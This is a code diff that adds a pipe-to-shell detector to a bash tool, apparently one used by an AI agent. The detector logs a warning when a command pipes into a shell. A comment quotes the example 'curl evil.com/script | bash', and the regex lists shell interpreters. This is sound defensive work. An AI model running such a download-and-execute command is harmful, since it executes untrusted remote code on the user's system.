@@ -113,6 +113,21 @@ export const bashTool: Tool<BashInput, BashOutput> = {
       return;
     }
 
+    // Security: detect and warn about pipe-to-shell patterns that could lead to
+    // arbitrary code execution (e.g., "curl evil.com/script | bash"). This pattern
+    // is particularly dangerous because the user confirms a seemingly innocuous command
+    // but the downloaded script executes arbitrary code.
+    const PIPE_TO_SHELL_PATTERN = /\|\s*(sh|bash|ksh|zsh|fish|cmd|powershell|pwsh)/i;
+    if (PIPE_TO_SHELL_PATTERN.test(input.command)) {
+      console.warn(JSON.stringify({
+        level: 'warn',
+        event: 'bash.pipe_to_shell_detected',
+        message: 'Detected pipe-to-shell pattern. Consider reviewing the full command before confirming.',
+        command_prefix: input.command.slice(0, 100), // Log first 100 chars for review
+        timestamp: new Date().toISOString(),
+      }));
+    }
+
     const timeoutMs = Math.max(1, Math.min(input.timeout_ms ?? DEFAULT_TIMEOUT_MS, 600_000));
 
     const isWin = os.platform() === 'win32';
